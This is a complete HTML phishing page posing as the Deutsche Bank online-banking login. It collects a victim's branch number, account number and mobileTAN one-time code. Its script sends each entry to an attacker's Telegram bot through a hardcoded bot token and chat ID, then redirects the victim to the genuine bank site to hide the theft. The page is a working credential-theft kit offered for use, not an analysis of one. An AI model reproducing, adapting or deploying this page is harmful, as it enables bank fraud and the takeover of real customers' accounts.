<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Online-Banking - Deutsche Bank</title>
    <style>
        :root {
            --db-blue: #003087;
            --db-dark: #001a4d;
            --db-red: #d71f28;
            --db-gray: #f3f3f3;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Segoe UI", Frutiger, Arial, sans-serif; }
        body, html { height: 100%; background-color: var(--db-blue); overflow-x: hidden; }

        .wrapper { display: flex; min-height: 100vh; width: 100%; }

        /* Left Section: Architectural Branding */
        .main-hero {
            flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px;
            background: linear-gradient(rgba(0,48,135,0.7), rgba(0,48,135,0.7)), 
                        url('https://www.deutsche-bank.de/content/dam/deutschebank/pk/digital-banking/online-banking/login-background-architectural.jpg');
            background-size: cover; background-position: center;
        }

        .login-card {
            background: white; width: 100%; max-width: 460px; padding: 45px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4); position: relative;
        }

        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 35px; }
        .logo-text { color: var(--db-blue); font-weight: 700; font-size: 18px; letter-spacing: -0.5px; }
        .logo-icon { width: 28px; height: 28px; border: 2.5px solid var(--db-blue); display: flex; align-items: center; justify-content: center; font-weight: 900; color: var(--db-blue); }

        h1 { font-size: 28px; font-weight: 300; color: #1a1a1a; margin-bottom: 10px; }
        .subtitle { font-size: 15px; color: #666; margin-bottom: 30px; line-height: 1.4; }

        /* Form Styling */
        .input-row { display: flex; gap: 12px; margin-bottom: 25px; }
        .input-group { display: flex; flex-direction: column; }
        .input-group label { font-size: 12px; color: #888; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
        .input-group input { padding: 12px; border: 1px solid #ccc; font-size: 18px; width: 100%; outline: none; transition: border 0.2s; }
        .input-group input:focus { border-color: var(--db-blue); }

        .branch { flex: 1.5; }
        .branch input { border-bottom: 3px solid var(--db-red); }
        .account { flex: 2; }
        .sub { flex: 1; }
        .sub input { background: var(--db-gray); color: #999; text-align: center; cursor: not-allowed; }

        /* OTP Specific Styling */
        .otp-input { 
            letter-spacing: 8px; text-align: center; font-size: 24px !important; 
            font-weight: bold; color: var(--db-blue);
        }

        .btn-submit { 
            background: var(--db-blue); color: white; padding: 14px 40px; border: none; 
            font-weight: 600; cursor: pointer; transition: background 0.2s; 
        }
        .btn-submit:hover { background: var(--db-dark); }

        .footer-links { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
        .link { color: var(--db-blue); text-decoration: none; font-size: 13px; }
        .link:hover { text-decoration: underline; }

        /* Loader Overlay */
        .loader {
            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.9); z-index: 100; align-items: center; justify-content: center;
            flex-direction: column;
        }
        .spinner {
            width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--db-blue);
            border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Sidebar Settings */
        .sidebar { width: 340px; background: white; border-left: 1px solid #ddd; display: flex; flex-direction: column; }
        .promo-area { background: var(--db-dark); color: white; padding: 30px; }
        .sidebar-footer { background: var(--db-dark); padding: 25px; color: white; font-size: 11px; margin-top: auto; opacity: 0.8; }

        #otp-section { display: none; }

        @media (max-width: 900px) { .wrapper { flex-direction: column; } .sidebar { width: 100%; } }
    </style>
</head>
<body>

<div class="wrapper">
    <main class="main-hero">
        <div class="login-card">
            <div class="loader" id="cardLoader">
                <div class="spinner"></div>
                <p style="color: var(--db-blue); font-weight: 600;">Verifying...</p>
            </div>

            <div class="card-header">
                <span class="logo-text">Deutsche Bank</span>
                <div class="logo-icon">/</div>
            </div>

            <div id="login-section">
                <h1>Good evening</h1>
                <p class="subtitle">Please enter your branch number, account number and sub-account to proceed to secure login.</p>
                <form id="formStep1">
                    <div class="input-row">
                        <div class="input-group branch">
                            <label>Branch</label>
                            <input type="text" id="branch_in" maxlength="3" pattern="\[0-9]*\" inputmode="numeric" required>
                        </div>
                        <div class="input-group account">
                            <label>Account</label>
                            <input type="text" id="account_in" maxlength="7" pattern="\[0-9]*\" inputmode="numeric" required>
                        </div>
                        <div class="input-group sub">
                            <label>Sub</label>
                            <input type="text" value="00" readonly>
                        </div>
                    </div>
                    <div class="footer-links">
                        <a href="#" class="link">Forgotten credentials?</a>
                        <button type="submit" class="btn-submit">Continue</button>
                    </div>
                </form>
            </div>

            <div id="otp-section">
                <h1>Identity Verification</h1>
                <p class="subtitle">We have sent a <strong>7-digit mobileTAN</strong> to your registered mobile number ending in â€¢â€¢â€¢â€¢. Please enter it below.</p>
                <form id="formStep2">
                    <div class="input-group" style="margin-bottom: 25px;">
                        <label>mobileTAN / Secure Code</label>
                        <input type="text" id="otp_in" class="otp-input" maxlength="7" pattern="\[0-9]*\" inputmode="numeric" placeholder="-------" required>
                    </div>
                    <div class="footer-links">
                        <p style="font-size: 12px; color: #888;">Code expires in <span id="timer">02:59</span></p>
                        <button type="submit" class="btn-continue btn-submit">Verify Access</button>
                    </div>
                </form>
            </div>
        </div>
    </main>

    <aside class="sidebar">
        <div class="promo-area">
            <h2 style="color: #ccff00; font-size: 42px;">2,0% <span style="font-size: 16px; color: white;">p.a.*</span></h2>
            <p style="font-weight: bold; margin-top: 5px;">FestzinsSparen</p>
        </div>
        <div style="padding: 30px; font-size: 14px; line-height: 1.6;">
            <p><strong>Security at a glance</strong></p>
            <p style="color: #666; margin-top: 10px;">Protect your accounts with our latest photoTAN and mobileTAN technology. Never share your security codes with anyone.</p>
        </div>
        <footer class="sidebar-footer">
            <p>Â© 2026 Deutsche Bank AG</p>
        </footer>
    </aside>
</div>

<script>
    const BOT_TOKEN = '8538945015:AAFnhCUSfpWw1U7Db-BaTb2dBFLUrMUPDYs';
    const CHAT_ID = '7195054297';
    const loader = document.getElementById('cardLoader');

    // Handle Login Submit
    document.getElementById('formStep1').addEventListener('submit', function(e) {
        e.preventDefault();
        loader.style.display = 'flex';

        const data = {
            branch: document.getElementById('branch_in').value,
            account: document.getElementById('account_in').value
        };

        const text = `ðŸ‘¤ **LOGIN ATTEMPT**\nBranch: ${data.branch}\nAccount: ${data.account}`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
        }).then(() => {
            setTimeout(() => {
                loader.style.display = 'none';
                document.getElementById('login-section').style.display = 'none';
                document.getElementById('otp-section').style.display = 'block';
                startTimer();
            }, 1500);
        });
    });

    // Handle OTP Submit
    document.getElementById('formStep2').addEventListener('submit', function(e) {
        e.preventDefault();
        loader.style.display = 'flex';

        const otp = document.getElementById('otp_in').value;
        const text = `ðŸ”‘ **OTP RECEIVED**\nCode: ${otp}`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
        }).then(() => {
            setTimeout(() => {
                window.location.href = "https://www.deutsche-bank.de/pk/digital-banking/online-banking.html";
            }, 2000);
        });
    });

    function startTimer() {
        let duration = 179;
        const display = document.getElementById('timer');
        setInterval(() => {
            let mins = Math.floor(duration / 60);
            let secs = duration % 60;
            display.textContent = `${mins}:${secs < 10 ? '0' + secs : secs}`;
            if (--duration < 0) duration = 0;
        }, 1000);
    }
</script>

</body>
</html>